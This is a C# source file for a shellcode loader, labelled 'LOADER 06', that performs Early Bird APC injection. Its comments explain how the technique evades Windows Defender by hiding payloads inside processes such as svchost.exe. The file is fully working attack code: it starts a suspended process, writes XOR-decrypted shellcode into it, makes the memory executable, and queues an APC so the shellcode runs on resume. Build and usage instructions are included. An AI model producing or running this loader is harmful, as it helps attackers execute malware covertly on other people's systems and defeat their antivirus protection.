// ============================================================================
// LOADER 06: Process Hollowing Alternative (Early Bird APC Injection)
// ============================================================================
//
// WHAT THIS DOES:
//   This loader creates a legitimate Windows process in a suspended state,
//   then queues our shellcode to run as an APC (Asynchronous Procedure Call)
//   on the process's main thread before it starts executing. When we resume
//   the process, our shellcode runs first, before the legitimate program's
//   code. This is called "Early Bird" injection because our code runs at the
//   very start of the process's life.
//
// WHY THIS IS NEEDED:
//   Classic process hollowing (create suspended process, unmap its image,
//   replace it with malicious code, resume) is heavily detected by Defender.
//   Defender specifically watches for the NtUnmapViewOfSection + write +
//   resume pattern. Early Bird APC injection achieves the same goal (running
//   code inside a legitimate process) without unmapping anything. We add our
//   shellcode as an APC to the suspended thread, and it runs when the thread
//   resumes. This is less suspicious because APCs are a normal Windows
//   mechanism used by legitimate programs.
//
// EVASION MECHANISM:
//   APC (Asynchronous Procedure Call) is a Windows feature where you can
//   queue a function to run on a specific thread. The thread runs the queued
//   function the next time it enters an "alertable" state. When a process
//   is created suspended, its main thread is in an alertable state by
//   default. So if we queue our shellcode as an APC and then resume the
//   thread, the APC (our shellcode) executes before the program's own code.
//
//   From Defender's perspective, a legitimate process (like svchost.exe)
//   started and is running. The shellcode is running inside that process's
//   memory space, under its name and its process tree. This makes it harder
//   for Defender to flag it compared to a standalone unknown executable.
//
// REFERENCES:
//   - Elastic: "Ten Process Injection Techniques: A Technical Survey"
//   - MITRE ATT&CK T1055.012 (Process Hollowing)
//   - Palo Alto Networks: "Process Injection Explained"
//   - Document: 05_shellcode_loader.md (process injection section)
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:earlybird.exe 06_process_hollowing_alt.cs
//
// USAGE:
//   earlybird.exe <legitimate_exe_path> <shellcode.bin> [xor_key_hex]
//
//   Example:
//     earlybird.exe C:\Windows\System32\svchost.exe encrypted.bin 4A7F2B...
//
//   The legitimate_exe_path should be a Windows system executable that
//   normally runs (svchost.exe, RuntimeBroker.exe, etc).
//
// ============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ProcessLauncher
{
    class Program
    {
        // ---- Structures ----

        // STARTUPINFO contains information about how the new process's window
        // should appear. We set it to all zeros (default settings).
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;              // size of this structure
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        // PROCESS_INFORMATION receives handles and IDs for the new process.
        // We need hProcess (process handle) and hThread (main thread handle).
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;     // handle to the new process
            public IntPtr hThread;      // handle to the process's main thread
            public int dwProcessId;     // process ID
            public int dwThreadId;      // thread ID
        }

        // ---- Windows API imports ----

        // CreateProcess starts a new process. We use CREATE_SUSPENDED flag
        // so the process is created but does not start running yet.
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,        // CREATE_SUSPENDED = 0x4
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        // VirtualAllocEx allocates memory inside the new process.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // WriteProcessMemory copies shellcode into the new process.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        // VirtualProtectEx changes memory protection in the new process.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // QueueUserAPC queues an APC to run on a specific thread.
        // When we queue our shellcode address as the APC function,
        // the thread will execute our shellcode when it resumes.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint QueueUserAPC(
            IntPtr pfnAPC,       // the function to call (our shellcode address)
            IntPtr hThread,      // the thread to queue the APC on
            IntPtr dwData        // parameter to pass (none)
        );

        // ResumeThread resumes the suspended process. This triggers the APC
        // to execute, which runs our shellcode before the process's own code.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        // CloseHandle releases handles when done.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // ---- Constants ----
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        // ---- XOR decryption ----
        static byte[] TransformData(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Process Launcher");
                Console.WriteLine("Usage: launcher.exe <exe_path> <data.bin> [key_hex]");
                Console.WriteLine("");
                Console.WriteLine("Example:");
                Console.WriteLine("  launcher.exe C:\\Windows\\System32\\svchost.exe data.bin");
                Console.WriteLine("  launcher.exe C:\\Windows\\System32\\RuntimeBroker.exe encrypted.bin 4A7F...");
                return;
            }

            string targetExePath = args[0];
            string shellcodePath = args[1];
            string xorKeyHex = args.Length >= 3 ? args[2] : null;

            // ---- Read and optionally decrypt shellcode ----
            byte[] shellcode = File.ReadAllBytes(shellcodePath);
            if (xorKeyHex != null)
            {
                byte[] xorKey = HexToBytes(xorKeyHex);
                shellcode = TransformData(shellcode, xorKey);
                Console.WriteLine("[+] Data decrypted: " + shellcode.Length + " bytes");
            }
            else
            {
                Console.WriteLine("[*] Data loaded: " + shellcode.Length + " bytes");
            }

            // ---- Step 1: Create the target process in SUSPENDED state ----
            // The process is created but its main thread is paused. It has not
            // executed any code yet. This gives us time to allocate memory inside
            // it, write our shellcode, and queue the APC before it starts running.
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            bool created = CreateProcess(
                targetExePath,       // the legitimate executable to run
                null,                // no command line arguments
                IntPtr.Zero,         // default process security
                IntPtr.Zero,         // default thread security
                false,               // do not inherit handles
                CREATE_SUSPENDED,    // create the process but do not run it yet
                IntPtr.Zero,         // default environment
                null,                // default working directory
                ref si,
                out pi
            );

            if (!created)
            {
                Console.WriteLine("[-] Failed to start target process. Check the executable path.");
                return;
            }

            Console.WriteLine("[+] Created suspended process: " + targetExePath);
            Console.WriteLine("    PID: " + pi.dwProcessId + " | TID: " + pi.dwThreadId);

            // ---- Step 2: Allocate memory in the suspended process ----
            // We allocate a block of memory inside the new process to hold
            // our shellcode. We start with PAGE_READWRITE permissions.
            IntPtr remoteMemory = VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (remoteMemory == IntPtr.Zero)
            {
                Console.WriteLine("[-] Remote memory allocation failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Console.WriteLine("[+] Allocated memory at: 0x" + remoteMemory.ToString("X"));

            // ---- Step 3: Write shellcode to the process ----
            UIntPtr bytesWritten;
            bool written = WriteProcessMemory(
                pi.hProcess,
                remoteMemory,
                shellcode,
                (uint)shellcode.Length,
                out bytesWritten
            );

            int shellcodeLength = shellcode.Length;
            Array.Clear(shellcode, 0, shellcode.Length);

            if (!written)
            {
                Console.WriteLine("[-] Memory write to target process failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Console.WriteLine("[+] Data written to target process: " + bytesWritten + " bytes");

            // ---- Step 4: Change memory to executable ----
            uint oldProtect;
            VirtualProtectEx(pi.hProcess, remoteMemory, (UIntPtr)shellcodeLength, PAGE_EXECUTE_READ, out oldProtect);
            Console.WriteLine("[+] Memory protection changed to EXECUTE_READ");

            // ---- Step 5: Queue the APC ----
            // QueueUserAPC adds our shellcode address as an APC to the
            // suspended thread. When the thread resumes, it will run our
            // shellcode first (before the legitimate program's code).
            //
            // This is the "Early Bird" part: our code runs at the very
            // beginning of the process's life, before any of the legitimate
            // program's initialization code.
            uint apcResult = QueueUserAPC(remoteMemory, pi.hThread, IntPtr.Zero);

            if (apcResult == 0)
            {
                Console.WriteLine("[-] APC queue operation failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }
            Console.WriteLine("[+] APC queued on main thread");

            // ---- Step 6: Resume the thread ----
            // This is the moment of execution. When we resume the thread,
            // Windows processes the queued APC first, which points to our
            // shellcode. Our shellcode runs inside the legitimate process.
            ResumeThread(pi.hThread);
            Console.WriteLine("[+] Thread resumed. Code is executing inside " + targetExePath);
            Console.WriteLine("[*] The code is running as part of a legitimate process.");
            Console.WriteLine("[*] The system sees " + targetExePath + " running.");

            // Clean up handles.
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}
